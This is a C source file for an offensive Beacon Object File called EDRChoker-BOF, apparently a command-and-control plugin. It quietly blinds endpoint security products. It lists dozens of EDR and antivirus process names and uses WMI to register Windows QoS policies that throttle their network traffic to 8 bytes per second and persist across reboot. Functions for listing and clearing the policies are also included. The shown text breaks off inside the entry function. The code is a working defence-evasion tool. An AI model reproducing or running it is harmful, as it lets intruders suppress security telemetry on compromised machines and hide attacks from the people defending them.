// entry.c (EDRChoker-BOF)
//
// Port of Two Seven One Three's EDRChoker to a Beacon Object File.
// Registers Windows QoS objects (MSFT_NetQosPolicySettingData in the
// root\StandardCimv2 WMI namespace) that cap outbound bandwidth on a target
// process to 8 bytes/sec — pacer.sys enforces the cap in kernel NDIS, under
// the EDR agent's socket layer, so the agent sees "successful" sends that
// die on the wire.
//
// InstanceID uses the "{guid}\{name}\ActiveStore" suffix trick from the
// original tool: routes the WMI Put to the runtime store (immediate effect)
// AND serializes to the persistent store (survives reboot).
//
// Commands (dispatched by edrchoker.axs):
//   throttleedr             - enumerate procs, throttle known EDR binaries
//   throttle <procname>     - throttle one process by name (basename or path)
//   clearall                - remove QoS policies whose Name matches our
//                             session-random prefix
//   clear <policy name>     - remove one QoS policy by exact Name
//   list                    - print our policies + running EDRs + throttle
//                             status (with pacer.sys binding reminder)

#include "common/bofdefs.h"
#include "common/beacon.h"

/* ---- EDR process list (parity with EDRSilencer-BOF's list) --------------- */

static const wchar_t* g_edrProcess[] = {
    // Microsoft Defender for Endpoint and Microsoft Defender Antivirus
    L"MsMpEng.exe", L"MsSense.exe", L"SenseIR.exe", L"SenseNdr.exe",
    L"SenseCncProxy.exe", L"SenseSampleUploader.exe",
    // Elastic EDR
    L"winlogbeat.exe", L"elastic-agent.exe", L"elastic-endpoint.exe", L"filebeat.exe",
    // Trellix EDR
    L"xagt.exe",
    // Qualys EDR
    L"QualysAgent.exe",
    // SentinelOne
    L"SentinelAgent.exe", L"SentinelAgentWorker.exe", L"SentinelServiceHost.exe",
    L"SentinelStaticEngine.exe", L"LogProcessorService.exe",
    L"SentinelStaticEngineScanner.exe", L"SentinelHelperService.exe",
    L"SentinelBrowserNativeHost.exe",
    // Cylance
    L"CylanceSvc.exe",
    // Cybereason
    L"AmSvc.exe", L"CrAmTray.exe", L"CrsSvc.exe", L"ExecutionPreventionSvc.exe",
    L"CybereasonAV.exe",
    // Carbon Black EDR
    L"cb.exe",
    // Carbon Black Cloud
    L"RepMgr.exe", L"RepUtils.exe", L"RepUx.exe", L"RepWAV.exe", L"RepWSC.exe",
    // Tanium
    L"TaniumClient.exe", L"TaniumCX.exe", L"TaniumDetectEngine.exe",
    // Palo Alto Networks Traps / Cortex XDR
    L"Traps.exe", L"cyserver.exe", L"CyveraService.exe", L"CyvrFsFlt.exe",
    // FortiEDR
    L"fortiedr.exe",
    // Cisco Secure Endpoint (Formerly Cisco AMP)
    L"sfc.exe",
    // ESET Inspect
    L"EIConnector.exe", L"ekrn.exe",
    // Harfanglab EDR
    L"hurukai.exe",
    // TrendMicro Apex One
    L"CETASvc.exe", L"WSCommunicator.exe", L"EndpointBasecamp.exe", L"TmListen.exe",
    L"Ntrtscan.exe", L"TmWSCSvc.exe", L"PccNTMon.exe", L"TMBMSRV.exe",
    L"CNTAoSMgr.exe", L"TmCCSF.exe",
};

#define EDR_PROCESS_COUNT (sizeof(g_edrProcess) / sizeof(g_edrProcess[0]))

/* ---- session-randomized policy Name prefix ------------------------------- */
static WCHAR  g_prefixBuf[64]     = {0};
static WCHAR* g_policyNamePrefix  = L"EDRC_";

/* ============================================================
 *  Integrity check (same shape as EDRSilencer-BOF)
 * ============================================================ */

static BOOL BofCheckHighIntegrity(void)
{
    HANDLE hToken = NULL;
    DWORD dwLength = 0;
    PTOKEN_MANDATORY_LABEL pTIL = NULL;
    DWORD dwIntegrityLevel = 0;
    BOOL isHighIntegrity = FALSE;

    if (!ADVAPI32$OpenThreadToken(KERNEL32$GetCurrentThread(), TOKEN_QUERY, TRUE, &hToken)) {
        if (KERNEL32$GetLastError() != ERROR_NO_TOKEN) {
            BeaconPrintf(CALLBACK_ERROR, "OpenThreadToken failed: 0x%x", KERNEL32$GetLastError());
            return FALSE;
        }
        if (!ADVAPI32$OpenProcessToken(KERNEL32$GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
            BeaconPrintf(CALLBACK_ERROR, "OpenProcessToken failed: 0x%x", KERNEL32$GetLastError());
            return FALSE;
        }
    }

    if (!ADVAPI32$GetTokenInformation(hToken, TokenIntegrityLevel, NULL, 0, &dwLength) &&
        KERNEL32$GetLastError() != ERROR_INSUFFICIENT_BUFFER) {
        BeaconPrintf(CALLBACK_ERROR, "GetTokenInformation failed: 0x%x", KERNEL32$GetLastError());
        KERNEL32$CloseHandle(hToken);
        return FALSE;
    }

    pTIL = (PTOKEN_MANDATORY_LABEL)KERNEL32$LocalAlloc(LPTR, dwLength);
    if (pTIL == NULL) {
        KERNEL32$CloseHandle(hToken);
        return FALSE;
    }

    if (!ADVAPI32$GetTokenInformation(hToken, TokenIntegrityLevel, pTIL, dwLength, &dwLength)) {
        KERNEL32$LocalFree(pTIL);
        KERNEL32$CloseHandle(hToken);
        return FALSE;
    }

    if (pTIL->Label.Sid == NULL || *ADVAPI32$GetSidSubAuthorityCount(pTIL->Label.Sid) < 1) {
        KERNEL32$LocalFree(pTIL);
        KERNEL32$CloseHandle(hToken);
        return FALSE;
    }

    dwIntegrityLevel = *ADVAPI32$GetSidSubAuthority(
        pTIL->Label.Sid,
        (DWORD)(UCHAR)(*ADVAPI32$GetSidSubAuthorityCount(pTIL->Label.Sid) - 1));

    isHighIntegrity = (dwIntegrityLevel >= SECURITY_MANDATORY_HIGH_RID);
    if (!isHighIntegrity) {
        BeaconPrintf(CALLBACK_ERROR,
            "[-] This BOF requires high integrity to Put MSFT_NetQosPolicySettingData in root\\StandardCimv2.");
    }

    KERNEL32$LocalFree(pTIL);
    KERNEL32$CloseHandle(hToken);
    return isHighIntegrity;
}

/* ============================================================
 *  WMI COM connect / disconnect
 * ============================================================ */

typedef struct {
    IWbemLocator*   pLoc;
    IWbemServices*  pSvc;
    BOOL            coInit;
} WmiCtx;

static HRESULT BofWmiConnect(WmiCtx* ctx)
{
    HRESULT hr;
    BSTR bstrNs = NULL;

    ctx->pLoc   = NULL;
    ctx->pSvc   = NULL;
    ctx->coInit = FALSE;

    hr = OLE32$CoInitializeEx(NULL, COINIT_MULTITHREADED);
    if (hr == S_OK) {
        ctx->coInit = TRUE;
    } else if (hr == S_FALSE || hr == RPC_E_CHANGED_MODE) {
        hr = S_OK;
    } else {
        BeaconPrintf(CALLBACK_ERROR, "CoInitializeEx failed: 0x%x", hr);
        return hr;
    }

    OLE32$CoInitializeSecurity(NULL, -1, NULL, NULL,
                               RPC_C_AUTHN_LEVEL_DEFAULT,
                               RPC_C_IMP_LEVEL_IMPERSONATE,
                               NULL, EOAC_NONE, NULL);

    hr = OLE32$CoCreateInstance(&CLSID_WbemLocator_, NULL,
                                CLSCTX_INPROC_SERVER,
                                &IID_IWbemLocator_, (LPVOID*)&ctx->pLoc);
    if (FAILED(hr)) {
        BeaconPrintf(CALLBACK_ERROR, "CoCreateInstance(WbemLocator) failed: 0x%x", hr);
        goto uninit;
    }

    bstrNs = OLEAUT32$SysAllocString(L"ROOT\\StandardCimv2");
    if (!bstrNs) { hr = E_OUTOFMEMORY; goto release; }

    hr = ctx->pLoc->lpVtbl->ConnectServer(ctx->pLoc, bstrNs, NULL, NULL, NULL,
                                          0, NULL, NULL, &ctx->pSvc);
    OLEAUT32$SysFreeString(bstrNs);
    if (FAILED(hr)) {
        BeaconPrintf(CALLBACK_ERROR,
            "IWbemLocator::ConnectServer(root\\StandardCimv2) failed: 0x%x", hr);
        goto release;
    }

    hr = OLE32$CoSetProxyBlanket((IUnknown*)ctx->pSvc,
                                 RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, NULL,
                                 RPC_C_AUTHN_LEVEL_CALL,
                                 RPC_C_IMP_LEVEL_IMPERSONATE,
                                 NULL, EOAC_NONE);
    if (FAILED(hr)) {
        BeaconPrintf(CALLBACK_ERROR, "CoSetProxyBlanket failed: 0x%x", hr);
        goto release;
    }

    return S_OK;

release:
    if (ctx->pSvc) { ctx->pSvc->lpVtbl->Release(ctx->pSvc); ctx->pSvc = NULL; }
    if (ctx->pLoc) { ctx->pLoc->lpVtbl->Release(ctx->pLoc); ctx->pLoc = NULL; }
uninit:
    if (ctx->coInit) {
        OLE32$CoUninitialize();
        ctx->coInit = FALSE;
    }
    return hr;
}

static void BofWmiDisconnect(WmiCtx* ctx)
{
    if (ctx->pSvc) { ctx->pSvc->lpVtbl->Release(ctx->pSvc); ctx->pSvc = NULL; }
    if (ctx->pLoc) { ctx->pLoc->lpVtbl->Release(ctx->pLoc); ctx->pLoc = NULL; }
    if (ctx->coInit) {
        OLE32$CoUninitialize();
        ctx->coInit = FALSE;
    }
}

/* ============================================================
 *  IWbemClassObject::Put helpers
 * ============================================================ */

static HRESULT BofPutBstr(IWbemClassObject* obj, LPCWSTR name, LPCWSTR val)
{
    VARIANT v;
    HRESULT hr;
    OLEAUT32$VariantInit(&v);
    v.vt = VT_BSTR;
    v.bstrVal = OLEAUT32$SysAllocString(val);
    if (!v.bstrVal) return E_OUTOFMEMORY;
    hr = obj->lpVtbl->Put(obj, (LPWSTR)name, 0, &v, 0);
    OLEAUT32$VariantClear(&v);
    return hr;
}

static HRESULT BofPutI4(IWbemClassObject* obj, LPCWSTR name, LONG val)
{
    VARIANT v;
    HRESULT hr;
    OLEAUT32$VariantInit(&v);
    v.vt = VT_I4;
    v.lVal = val;
    hr = obj->lpVtbl->Put(obj, (LPWSTR)name, 0, &v, 0);
    OLEAUT32$VariantClear(&v);
    return hr;
}

/* ============================================================
 *  Create one throttle policy (shared logic for throttle / throttleedr)
 * ============================================================ */

static HRESULT BofCreateThrottlePolicy(IWbemServices* pSvc, LPCWSTR wProcName,
                                       WCHAR* outPolicyName, size_t outCap)
{
    HRESULT hr;
    IWbemClassObject* pClass = NULL;
    IWbemClassObject* pInst  = NULL;
    BSTR   bstrClass = NULL;
    GUID   guid      = {0};
    WCHAR  guidStr[64]     = {0};
    WCHAR  policyName[64]  = {0};
    WCHAR  instanceId[160] = {0};
    size_t guidLen;

    bstrClass = OLEAUT32$SysAllocString(L"MSFT_NetQosPolicySettingData");
    if (!bstrClass) return E_OUTOFMEMORY;

    hr = pSvc->lpVtbl->GetObject(pSvc, bstrClass, 0, NULL, &pClass, NULL);
    OLEAUT32$SysFreeString(bstrClass);
    if (FAILED(hr)) {
        BeaconPrintf(CALLBACK_ERROR,
            "    [-] GetObject(MSFT_NetQosPolicySettingData) failed: 0x%x", hr);
        return hr;
    }

    hr = pClass->lpVtbl->SpawnInstance(pClass, 0, &pInst);
    pClass->lpVtbl->Release(pClass);
    if (FAILED(hr)) {
        BeaconPrintf(CALLBACK_ERROR, "    [-] SpawnInstance failed: 0x%x", hr);
        return hr;
    }

    hr = OLE32$CoCreateGuid(&guid);
    if (FAILED(hr)) { BeaconPrintf(CALLBACK_ERROR, "    [-] CoCreateGuid failed: 0x%x", hr); goto cleanup; }
    OLE32$StringFromGUID2(&guid, guidStr, sizeof(guidStr) / sizeof(WCHAR));

    guidLen = MSVCRT$wcslen(guidStr);
    if (guidLen >= 2 && guidStr[0] == L'{' && guidStr[guidLen - 1] == L'}') {
        guidStr[guidLen - 1] = L'\0';
        for (size_t i = 0; i < guidLen - 2; i++) guidStr[i] = guidStr[i + 1];
        guidStr[guidLen - 2] = L'\0';
    }

    MSVCRT$_snwprintf(policyName, sizeof(policyName) / sizeof(WCHAR) - 1,
                      L"%ls%.8ls", g_policyNamePrefix, guidStr);
    policyName[sizeof(policyName) / sizeof(WCHAR) - 1] = L'\0';

    MSVCRT$_snwprintf(instanceId, sizeof(instanceId) / sizeof(WCHAR) - 1,
                      L"%ls\\%ls\\ActiveStore", guidStr, policyName);
    instanceId[sizeof(instanceId) / sizeof(WCHAR) - 1] = L'\0';

    hr = BofPutI4(pInst, L"Owner", 1);
    if (FAILED(hr)) { BeaconPrintf(CALLBACK_ERROR, "    [-] Put(Owner) failed: 0x%x", hr); goto cleanup; }
    hr = BofPutBstr(pInst, L"Name", policyName);
    if (FAILED(hr)) { BeaconPrintf(CALLBACK_ERROR, "    [-] Put(Name) failed: 0x%x", hr); goto cleanup; }
    hr = BofPutBstr(pInst, L"InstanceID", instanceId);
    if (FAILED(hr)) { BeaconPrintf(CALLBACK_ERROR, "    [-] Put(InstanceID) failed: 0x%x", hr); goto cleanup; }
    hr = BofPutBstr(pInst, L"AppPathNameMatchCondition", wProcName);
    if (FAILED(hr)) { BeaconPrintf(CALLBACK_ERROR, "    [-] Put(AppPathNameMatchCondition) failed: 0x%x", hr); goto cleanup; }
    hr = BofPutI4(pInst, L"IPProtocolMatchCondition", 3);
    if (FAILED(hr)) { BeaconPrintf(CALLBACK_ERROR, "    [-] Put(IPProtocolMatchCondition) failed: 0x%x", hr); goto cleanup; }
    hr = BofPutI4(pInst, L"NetworkProfile", 0);
    if (FAILED(hr)) { BeaconPrintf(CALLBACK_ERROR, "    [-] Put(NetworkProfile) failed: 0x%x", hr); goto cleanup; }
    hr = BofPutBstr(pInst, L"ThrottleRateAction", L"8");
    if (FAILED(hr)) { BeaconPrintf(CALLBACK_ERROR, "    [-] Put(ThrottleRateAction) failed: 0x%x", hr); goto cleanup; }

    hr = pSvc->lpVtbl->PutInstance(pSvc, pInst, WBEM_FLAG_CREATE_ONLY, NULL, NULL);
    if (FAILED(hr)) {
        BeaconPrintf(CALLBACK_ERROR, "    [-] PutInstance failed: 0x%x", hr);
        goto cleanup;
    }

    if (outPolicyName && outCap > 0) {
        size_t n = MSVCRT$wcslen(policyName);
        if (n >= outCap) n = outCap - 1;
        MSVCRT$memcpy(outPolicyName, policyName, n * sizeof(WCHAR));
        outPolicyName[n] = L'\0';
    }

cleanup:
    if (pInst) pInst->lpVtbl->Release(pInst);
    return hr;
}

/* ============================================================
 *  Commands
 * ============================================================ */

static void CmdThrottle(const char* procNameA)
{
    WmiCtx ctx = {0};
    WCHAR wProcName[MAX_PATH] = {0};
    WCHAR policyName[64] = {0};
    HRESULT hr;

    if (KERNEL32$MultiByteToWideChar(CP_UTF8, 0, procNameA, -1, wProcName,
                                     sizeof(wProcName) / sizeof(WCHAR)) == 0) {
        BeaconPrintf(CALLBACK_ERROR, "MultiByteToWideChar failed: 0x%x",
                     KERNEL32$GetLastError());
        return;
    }

    hr = BofWmiConnect(&ctx);
    if (FAILED(hr)) return;

    BeaconPrintf(CALLBACK_OUTPUT, "THROTTLING! Process: %ls", wProcName);
    hr = BofCreateThrottlePolicy(ctx.pSvc, wProcName, policyName,
                                 sizeof(policyName) / sizeof(WCHAR));
    if (SUCCEEDED(hr)) {
        BeaconPrintf(CALLBACK_OUTPUT,
            "    [+] Policy \"%ls\" registered (throttle 8 B/s, TCP+UDP, all profiles).",
            policyName);
    }

    BofWmiDisconnect(&ctx);
}

static void CmdThrottleEdr(void)
{
    WmiCtx ctx = {0};
    HANDLE hSnap = INVALID_HANDLE_VALUE;
    PROCESSENTRY32W pe = {0};
    BOOL found = FALSE;
    BOOL handled[EDR_PROCESS_COUNT];
    HRESULT hr;

    MSVCRT$memset(handled, 0, sizeof(handled));

    hr = BofWmiConnect(&ctx);
    if (FAILED(hr)) return;

    hSnap = KERNEL32$CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) {
        BeaconPrintf(CALLBACK_ERROR, "CreateToolhelp32Snapshot failed: 0x%x",
                     KERNEL32$GetLastError());
        BofWmiDisconnect(&ctx);
        return;
    }

    pe.dwSize = sizeof(pe);
    if (!KERNEL32$Process32FirstW(hSnap, &pe)) {
        BeaconPrintf(CALLBACK_ERROR, "Process32FirstW failed: 0x%x",
                     KERNEL32$GetLastError());
        KERNEL32$CloseHandle(hSnap);
        BofWmiDisconnect(&ctx);
        return;
    }

    do {
        for (size_t i = 0; i < EDR_PROCESS_COUNT; i++) {
            if (handled[i]) continue;
            if (MSVCRT$wcscmp(pe.szExeFile, g_edrProcess[i]) != 0) continue;

            handled[i] = TRUE;
            found = TRUE;
            WCHAR policyName[64] = {0};

            BeaconPrintf(CALLBACK_OUTPUT, "Detected EDR process: %ls (%lu)",
                         pe.szExeFile, pe.th32ProcessID);
            HRESULT h = BofCreateThrottlePolicy(ctx.pSvc, pe.szExeFile,
                                                policyName,
                                                sizeof(policyName) / sizeof(WCHAR));
            if (SUCCEEDED(h)) {
                BeaconPrintf(CALLBACK_OUTPUT,
                    "    [+] Policy \"%ls\" registered (throttle 8 B/s, TCP+UDP).",
                    policyName);
            }
            break;
        }
    } while (KERNEL32$Process32NextW(hSnap, &pe));

    if (!found) {
        BeaconPrintf(CALLBACK_OUTPUT,
            "[-] No EDR process detected. Update the edrProcess list or use 'throttle <name>'.");
    }

    KERNEL32$CloseHandle(hSnap);
    BofWmiDisconnect(&ctx);
}

static void CmdClearAll(void)
{
    WmiCtx ctx = {0};
    IEnumWbemClassObject* pEnum = NULL;
    IWbemClassObject* pObj = NULL;
    BSTR bstrClass = NULL;
    ULONG uReturn = 0;
    HRESULT hr;
    int deleted = 0;
    size_t prefixLen;

    hr = BofWmiConnect(&ctx);
    if (FAILED(hr)) return;

    bstrClass = OLEAUT32$SysAllocString(L"MSFT_NetQosPolicySettingData");
    if (!bstrClass) { BofWmiDisconnect(&ctx); return; }

    hr = ctx.pSvc->lpVtbl->CreateInstanceEnum(ctx.pSvc, bstrClass,
        WBEM_FLAG_RETURN_IMMEDIATELY | WBEM_FLAG_FORWARD_ONLY, NULL, &pEnum);
    OLEAUT32$SysFreeString(bstrClass);
    if (FAILED(hr)) {
        BeaconPrintf(CALLBACK_ERROR, "CreateInstanceEnum failed: 0x%x", hr);
        BofWmiDisconnect(&ctx);
        return;
    }

    prefixLen = MSVCRT$wcslen(g_policyNamePrefix);

    while (TRUE) {
        pObj = NULL;
        uReturn = 0;
        hr = pEnum->lpVtbl->Next(pEnum, WBEM_INFINITE, 1, &pObj, &uReturn);
        if (FAILED(hr) || uReturn == 0) break;

        VARIANT vName, vPath;
        OLEAUT32$VariantInit(&vName);
        OLEAUT32$VariantInit(&vPath);

        HRESULT hrG = pObj->lpVtbl->Get(pObj, L"Name", 0, &vName, NULL, NULL);
        if (SUCCEEDED(hrG) && vName.vt == VT_BSTR && vName.bstrVal &&
            MSVCRT$_wcsnicmp(vName.bstrVal, g_policyNamePrefix, prefixLen) == 0) {

            HRESULT hrP = pObj->lpVtbl->Get(pObj, L"__PATH", 0, &vPath, NULL, NULL);
            if (SUCCEEDED(hrP) && vPath.vt == VT_BSTR && vPath.bstrVal) {
                HRESULT hrD = ctx.pSvc->lpVtbl->DeleteInstance(ctx.pSvc,
                    vPath.bstrVal, 0, NULL, NULL);
                if (SUCCEEDED(hrD)) {
                    BeaconPrintf(CALLBACK_OUTPUT, "REMOVED! %ls", vName.bstrVal);
                    deleted++;
                } else {
                    BeaconPrintf(CALLBACK_ERROR,
                        "DeleteInstance(%ls) failed: 0x%x", vName.bstrVal, hrD);
                }
            }
        }

        OLEAUT32$VariantClear(&vPath);
        OLEAUT32$VariantClear(&vName);
        pObj->lpVtbl->Release(pObj);
    }

    if (deleted == 0) {
        BeaconPrintf(CALLBACK_OUTPUT,
            "[-] No policies matching prefix \"%ls\" found.", g_policyNamePrefix);
    } else {
        BeaconPrintf(CALLBACK_OUTPUT,
            "[+] Removed %d QoS policy(ies) matching prefix \"%ls\".",
            deleted, g_policyNamePrefix);
    }

    if (pEnum) pEnum->lpVtbl->Release(pEnum);
    BofWmiDisconnect(&ctx);
}

static void CmdClear(const char* policyNameA)
{
    WmiCtx ctx = {0};
    WCHAR wName[128] = {0};
    IEnumWbemClassObject* pEnum = NULL;
    IWbemClassObject* pObj = NULL;
    BSTR bstrClass = NULL;
    ULONG uReturn = 0;
    HRESULT hr;
    BOOL found = FALSE;

    if (KERNEL32$MultiByteToWideChar(CP_UTF8, 0, policyNameA, -1, wName,
                                     sizeof(wName) / sizeof(WCHAR)) == 0) {
        BeaconPrintf(CALLBACK_ERROR, "MultiByteToWideChar failed: 0x%x",
                     KERNEL32$GetLastError());
        return;
    }

    hr = BofWmiConnect(&ctx);
    if (FAILED(hr)) return;

    bstrClass = OLEAUT32$SysAllocString(L"MSFT_NetQosPolicySettingData");
    if (!bstrClass) { BofWmiDisconnect(&ctx); return; }

    hr = ctx.pSvc->lpVtbl->CreateInstanceEnum(ctx.pSvc, bstrClass,
        WBEM_FLAG_RETURN_IMMEDIATELY | WBEM_FLAG_FORWARD_ONLY, NULL, &pEnum);
    OLEAUT32$SysFreeString(bstrClass);
    if (FAILED(hr)) {
        BeaconPrintf(CALLBACK_ERROR, "CreateInstanceEnum failed: 0x%x", hr);
        BofWmiDisconnect(&ctx);
        return;
    }

    while (!found) {
        pObj = NULL;
        uReturn = 0;
        hr = pEnum->lpVtbl->Next(pEnum, WBEM_INFINITE, 1, &pObj, &uReturn);
        if (FAILED(hr) || uReturn == 0) break;

        VARIANT vName, vPath;
        OLEAUT32$VariantInit(&vName);
        OLEAUT32$VariantInit(&vPath);

        HRESULT hrG = pObj->lpVtbl->Get(pObj, L"Name", 0, &vName, NULL, NULL);
        if (SUCCEEDED(hrG) && vName.vt == VT_BSTR && vName.bstrVal &&
            MSVCRT$wcscmp(vName.bstrVal, wName) == 0) {
            HRESULT hrP = pObj->lpVtbl->Get(pObj, L"__PATH", 0, &vPath, NULL, NULL);
            if (SUCCEEDED(hrP) && vPath.vt == VT_BSTR && vPath.bstrVal) {
                HRESULT hrD = ctx.pSvc->lpVtbl->DeleteInstance(ctx.pSvc,
                    vPath.bstrVal, 0, NULL, NULL);
                if (SUCCEEDED(hrD)) {
                    BeaconPrintf(CALLBACK_OUTPUT, "REMOVED! %ls", vName.bstrVal);
                    found = TRUE;
                } else {
                    BeaconPrintf(CALLBACK_ERROR,
                        "DeleteInstance(%ls) failed: 0x%x", vName.bstrVal, hrD);
                }
            }
        }

        OLEAUT32$VariantClear(&vPath);
        OLEAUT32$VariantClear(&vName);
        pObj->lpVtbl->Release(pObj);
    }

    if (!found) {
        BeaconPrintf(CALLBACK_OUTPUT, "[-] No policy named \"%ls\" found.", wName);
    }

    if (pEnum) pEnum->lpVtbl->Release(pEnum);
    BofWmiDisconnect(&ctx);
}

/* ============================================================
 *  list — session state + our policies + running EDR + status
 * ============================================================ */

#define LIST_MAX_TARGETS 64
#define LIST_TARGET_LEN  128

static void CmdList(void)
{
    WmiCtx ctx = {0};
    IEnumWbemClassObject* pEnum = NULL;
    IWbemClassObject* pObj = NULL;
    BSTR bstrClass = NULL;
    ULONG uReturn = 0;
    HRESULT hr;
    formatp fmt;
    BOOL fmtOpen = FALSE;
    HANDLE hSnap = INVALID_HANDLE_VALUE;
    PROCESSENTRY32W pe = {0};
    int ourCount = 0;
    int total = 0, throttledCount = 0;
    size_t prefixLen;

    WCHAR targets[LIST_MAX_TARGETS][LIST_TARGET_LEN];
    MSVCRT$memset(targets, 0, sizeof(targets));

    BeaconFormatAlloc(&fmt, 65536);
    fmtOpen = TRUE;

    BeaconFormatPrintf(&fmt, "[*] edr-choker list:\n");
    BeaconFormatPrintf(&fmt, "    policy name prefix (this session): %ls\n\n",
                       g_policyNamePrefix);

    hr = BofWmiConnect(&ctx);
    if (FAILED(hr)) {
        BeaconFormatPrintf(&fmt, "[-] WMI connect failed: 0x%x\n", hr);
        goto done;
    }

    bstrClass = OLEAUT32$SysAllocString(L"MSFT_NetQosPolicySettingData");
    if (!bstrClass) goto done;

    hr = ctx.pSvc->lpVtbl->CreateInstanceEnum(ctx.pSvc, bstrClass,
        WBEM_FLAG_RETURN_IMMEDIATELY | WBEM_FLAG_FORWARD_ONLY, NULL, &pEnum);
    OLEAUT32$SysFreeString(bstrClass);
    if (FAILED(hr)) {
        BeaconFormatPrintf(&fmt, "[-] CreateInstanceEnum failed: 0x%x\n", hr);
        goto done;
    }

    prefixLen = MSVCRT$wcslen(g_policyNamePrefix);

    BeaconFormatPrintf(&fmt, "[+] QoS policies owned by this session:\n");
    BeaconFormatPrintf(&fmt, "    %-32s  %-32s  %s\n",
                       "POLICY NAME", "TARGET (AppPathNameMatchCondition)", "RATE");
    BeaconFormatPrintf(&fmt, "    %-32s  %-32s  %s\n",
                       "--------------------------------",
                       "--------------------------------",
                       "-------");

    while (TRUE) {
        pObj = NULL;
        uReturn = 0;
        hr = pEnum->lpVtbl->Next(pEnum, WBEM_INFINITE, 1, &pObj, &uReturn);
        if (FAILED(hr) || uReturn == 0) break;

        VARIANT vName, vApp, vRate;
        OLEAUT32$VariantInit(&vName);
        OLEAUT32$VariantInit(&vApp);
        OLEAUT32$VariantInit(&vRate);

        HRESULT hrG = pObj->lpVtbl->Get(pObj, L"Name", 0, &vName, NULL, NULL);
        if (SUCCEEDED(hrG) && vName.vt == VT_BSTR && vName.bstrVal &&
            MSVCRT$_wcsnicmp(vName.bstrVal, g_policyNamePrefix, prefixLen) == 0) {

            LPCWSTR appName = L"(none)";
            LPCWSTR rateStr = L"(none)";
            WCHAR   rateBuf[32] = {0};

            hrG = pObj->lpVtbl->Get(pObj, L"AppPathNameMatchCondition", 0, &vApp, NULL, NULL);
            if (SUCCEEDED(hrG) && vApp.vt == VT_BSTR && vApp.bstrVal)
                appName = vApp.bstrVal;

            hrG = pObj->lpVtbl->Get(pObj, L"ThrottleRateAction", 0, &vRate, NULL, NULL);
            if (SUCCEEDED(hrG)) {
                if (vRate.vt == VT_BSTR && vRate.bstrVal) {
                    rateStr = vRate.bstrVal;
                } else if (vRate.vt == VT_I4 || vRate.vt == VT_UI4) {
                    MSVCRT$_snwprintf(rateBuf, 31, L"%lu", (unsigned long)vRate.lVal);
                    rateBuf[31] = L'\0';
                    rateStr = rateBuf;
                }
            }

            BeaconFormatPrintf(&fmt, "    %-32ls  %-32ls  %ls B/s\n",
                               vName.bstrVal, appName, rateStr);

            if (ourCount < LIST_MAX_TARGETS && appName) {
                size_t n = MSVCRT$wcslen(appName);
                if (n >= LIST_TARGET_LEN) n = LIST_TARGET_LEN - 1;
                MSVCRT$memcpy(targets[ourCount], appName, n * sizeof(WCHAR));
                targets[ourCount][n] = L'\0';
            }
            ourCount++;
        }

        OLEAUT32$VariantClear(&vRate);
        OLEAUT32$VariantClear(&vApp);
        OLEAUT32$VariantClear(&vName);
        pObj->lpVtbl->Release(pObj);
    }

    if (ourCount == 0) {
        BeaconFormatPrintf(&fmt, "    (none)\n");
    } else {
        BeaconFormatPrintf(&fmt, "    Total: %d\n", ourCount);
    }

    BeaconFormatPrintf(&fmt,
        "\n[+] Running EDR processes (matched against built-in list):\n");

    hSnap = KERNEL32$CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) {
        BeaconFormatPrintf(&fmt, "[-] CreateToolhelp32Snapshot failed: 0x%x\n",
                           KERNEL32$GetLastError());
        goto done;
    }

    pe.dwSize = sizeof(pe);
    if (!KERNEL32$Process32FirstW(hSnap, &pe)) {
        BeaconFormatPrintf(&fmt, "[-] Process32FirstW failed: 0x%x\n",
                           KERNEL32$GetLastError());
        goto done;
    }

    BeaconFormatPrintf(&fmt, "    %-6s  %-10s  %s\n",
                       "PID", "THROTTLED", "NAME");
    BeaconFormatPrintf(&fmt, "    %-6s  %-10s  %s\n",
                       "------", "----------",
                       "--------------------------------");

    do {
        BOOL match = FALSE;
        for (size_t i = 0; i < EDR_PROCESS_COUNT; i++) {
            if (MSVCRT$wcscmp(pe.szExeFile, g_edrProcess[i]) == 0) { match = TRUE; break; }
        }
        if (!match) continue;

        BOOL isThrottled = FALSE;
        for (int i = 0; i < ourCount && i < LIST_MAX_TARGETS; i++) {
            if (targets[i][0] &&
                MSVCRT$_wcsicmp(targets[i], pe.szExeFile) == 0) {
                isThrottled = TRUE;
                break;
            }
        }

        BeaconFormatPrintf(&fmt, "    %-6lu  %-10s  %ls\n",
                           pe.th32ProcessID,
                           isThrottled ? "YES" : "NO",
                           pe.szExeFile);
        total++;
        if (isThrottled) throttledCount++;
    } while (KERNEL32$Process32NextW(hSnap, &pe));

    if (total == 0) {
        BeaconFormatPrintf(&fmt, "    (none)\n");
    } else {
        BeaconFormatPrintf(&fmt, "    Total: %d (%d throttled)\n",
                           total, throttledCount);
    }

done:
    if (hSnap != INVALID_HANDLE_VALUE) KERNEL32$CloseHandle(hSnap);
    if (pEnum) pEnum->lpVtbl->Release(pEnum);
    BofWmiDisconnect(&ctx);

    if (fmtOpen) {
        int outSize = 0;
        char* outStr = BeaconFormatToString(&fmt, &outSize);
        if (outStr && outSize > 0) {
            BeaconOutput(CALLBACK_OUTPUT, outStr, outSize);
        }
        BeaconFormatFree(&fmt);
    }
}

/* ============================================================
 *  BOF entry
 * ============================================================ */

void go(char* args, int alen)
{
    datap parser;
    char* cmd     = NULL;
    char* arg     = NULL;
    char* prefixA = NULL;
    int   cmdLen  = 0;
    int   argLen  = 0;
    int   pfxLen  = 0;

    BeaconDataParse(&parser, args, alen);
    cmd     = BeaconDataExtract(&parser, &cmdLen);
    arg     = BeaconDataExtract(&parser, &argLen);
    prefixA = BeaconDataExtract(&parser, &pfxLen);

    if (!cmd || cmdLen <= 0) {
        BeaconPrintf(CALLBACK_ERROR,
            "Usage: edrchoker <throttleedr|throttle <name>|clearall|clear <name>|list|state>");
        return;
    }

    if (prefixA && pfxLen > 1) {
        if (KERNEL32$MultiByteToWideChar(CP_UTF8, 0, prefixA, -1,
                                         g_prefixBuf,
                                         sizeof(g_prefixBuf) / sizeof(WCHAR)) > 0) {
            g_policyNamePrefix = g_prefixBuf;
        }
    }

    if (!BofCheckHighIntegrity()) return;

    if (MSVCRT$strcmp(cmd, "throttle") == 0) {
        if (!arg || argLen <= 1) {
            BeaconPrintf(CALLBACK_ERROR,
                "[-] 'throttle' requires a process name (basename or full path).");
            return;
        }
        CmdThrottle(arg);
    }
